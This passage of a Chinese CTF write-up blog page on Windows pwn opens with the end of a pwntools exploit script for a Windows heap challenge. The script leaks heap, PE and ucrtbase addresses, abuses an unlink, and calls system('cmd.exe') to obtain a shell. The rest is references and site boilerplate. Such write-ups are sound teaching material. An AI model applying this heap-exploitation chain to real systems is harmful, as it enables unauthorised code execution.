cmd(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index &gt;"</span>,str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"content  &gt;"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    raw_input()</span><br><span class="line">    <span class="comment">#leak heap addr</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        Alloc(<span class="number">0x80</span>)<span class="comment">#0-5</span></span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    Delete(<span class="number">3</span>)</span><br><span class="line">    Show(<span class="number">1</span>)</span><br><span class="line">    heap_base = u32(p.recvn(<span class="number">4</span>))</span><br><span class="line">    log.success(<span class="string">"heap base =&gt; "</span> + hex(heap_base))</span><br><span class="line">    bss_1 = heap_base-(<span class="number">0x5b0</span><span class="number">-0x4a4</span>)</span><br><span class="line">    Edit(<span class="number">1</span>,p32(bss_1<span class="number">-4</span>)+p32(bss_1))</span><br><span class="line">    <span class="comment">#unlink</span></span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">1</span>,p32(bss_1<span class="number">-4</span>))</span><br><span class="line">    Show(<span class="number">1</span>)</span><br><span class="line">    pe_base = u32(p.recvn(<span class="number">3</span>)+<span class="string">'\x00'</span>) - <span class="number">0x1049</span></span><br><span class="line">    log.success(<span class="string">"pe base =&gt; "</span> + hex(pe_base))</span><br><span class="line">    <span class="comment">#leak ucrtbase</span></span><br><span class="line">    Edit(<span class="number">1</span>,p32(pe_base+<span class="number">0x1049</span>)+p32(pe_base+<span class="number">0x2054</span>)+p32(pe_base+<span class="number">0x1049</span>)+p32(bss_1<span class="number">-4</span>))</span><br><span class="line">    Show(<span class="number">1</span>)</span><br><span class="line">    ucrt_base = u32(p.recvn(<span class="number">4</span>)) - (<span class="number">0x770c53e0</span><span class="number">-0x77080000</span>)</span><br><span class="line">    log.success(<span class="string">"ucrt base =&gt; "</span> + hex(ucrt_base))</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    system_addr = ucrt_base + (<span class="number">0x7716c730</span><span class="number">-0x77080000</span>)</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    Edit(<span class="number">2</span>,p32(system_addr)+p32(bss_1+<span class="number">4</span>)+<span class="string">"cmd.exe\x00"</span>)</span><br><span class="line">    Show(<span class="number">1</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>非常感谢xxrw和lyyl两位大佬的指导 :)</p>
+<p><a href="https://www.lyyl.online/2019/10/09/windbg%E7%9A%84%E4%BD%BF%E7%94%A8/" target="_blank" rel="noopener">windbg的使用</a></p>
+<p><a href="https://blog.lyyl.online/2020/09/19/Windows-Pwn/" target="_blank" rel="noopener">WindowsPwn</a></p>
+<p><a href="https://kirin-say.top/2020/01/01/Heap-in-Windows/" target="_blank" rel="noopener">Heap-in-Windows</a></p>
+<p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/07/09/winpwn/" target="_blank" rel="noopener">winpwn</a></p>
+<p><a href="https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-chinese-version" target="_blank" rel="noopener">Windows 10 Nt Heap Exploitation (Chinese version)</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的支持将鼓励我继续创作</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="ama2in9 WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="ama2in9 Alipay"/>
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/12/19/xihulunjian/" rel="next" title="西湖论剑IoT && X-NUCA && KCTF Q3">
+                <i class="fa fa-chevron-left"></i> 西湖论剑IoT && X-NUCA && KCTF Q3
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/head.png"
+                alt="ama2in9" />
+            
+              <p class="site-author-name" itemprop="name">ama2in9</p>
+              <p class="site-description motion-element" itemprop="description">Seeing how far I have been.</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">72</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">33</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.piddnad.cn/" title="Piddnad" target="_blank">Piddnad</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://p4nda.top/" title="P4nda" target="_blank">P4nda</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://sunichi.github.io/" title="Sunichi" target="_blank">Sunichi</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hwhxy.github.io/" title="HWHXY" target="_blank">HWHXY</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://e3pem.github.io/" title="E3pem" target="_blank">E3pem</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://litch1.club/" title="Litch1" target="_blank">Litch1</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://xiaoxiaorenwu.top/" title="xiaoxiaorenwu" target="_blank">xiaoxiaorenwu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://v1ckydxp.github.io/" title="v1cky" target="_blank">v1cky</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://swordfaith.github.io/" title="swordfaith" target="_blank">swordfaith</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://harmoc.com/" title="harmoc" target="_blank">harmoc</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#windows-pwn初探"><span class="nav-number">1.</span> <span class="nav-text">windows pwn初探</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#调试"><span class="nav-number">1.3.</span> <span class="nav-text">调试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基础知识"><span class="nav-number">1.4.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#windows异常处理机制"><span class="nav-number">1.4.1.</span> <span class="nav-text">windows异常处理机制</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HitbGsec-babystack"><span class="nav-number">1.5.</span> <span class="nav-text">HitbGsec-babystack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#程序逻辑-amp-amp-漏洞利用"><span class="nav-number">1.5.1.</span> <span class="nav-text">程序逻辑 &amp;&amp; 漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-py"><span class="nav-number">1.5.2.</span> <span class="nav-text">exp.py</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#qwb2020-easyoverflow"><span class="nav-number">1.6.</span> <span class="nav-text">qwb2020-easyoverflow</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#程序逻辑-amp-amp-漏洞利用-1"><span class="nav-number">1.6.1.</span> <span class="nav-text">程序逻辑 &amp;&amp; 漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-py-1"><span class="nav-number">1.6.2.</span> <span class="nav-text">exp.py</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SCTF2020-EasyWinHeap"><span class="nav-number">1.7.</span> <span class="nav-text">SCTF2020-EasyWinHeap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#程序逻辑-amp-漏洞利用"><span class="nav-number">1.7.1.</span> <span class="nav-text">程序逻辑 &amp; 漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-py-2"><span class="nav-number">1.7.2.</span> <span class="nav-text">exp.py</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考资料"><span class="nav-number">1.8.</span> <span class="nav-text">参考资料</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ama2in9</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Pisces</a> v6.3.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+  
+    <script id="dsq-count-scr" src="https://xmzyshypnc.disqus.com/count.js" async></script>
+  
+
+  
+    <script type="text/javascript">
+      var disqus_config = function () {
+        this.page.url = 'http://ama2in9.top/2020/12/24/winpwn/';
+        this.page.identifier = '2020/12/24/winpwn/';
+        this.page.title = 'winpwn';
+        };
+      function loadComments () {
+        var d = document, s = d.createElement('script');
+        s.src = 'https://xmzyshypnc.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      }
+      
+        loadComments();
+      
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  
+  
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(function (item) {
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: true,
+        notify: true,
+        appId: 'YbpHIa6XHNsKv4wX2wGjnrK7-gzGzoHsz',
+        appKey: '1fjf9mQl90nKdRPfq1zhDyIE',
+        placeholder: 'Just go go',
+        avatar:'mm',
+        meta:guest,
+        pageSize:'10' || 10,
+        visitor: true
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"right","hOffset":0,"vOffset":-50},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"tagMode":false});</script></body>
+</html>
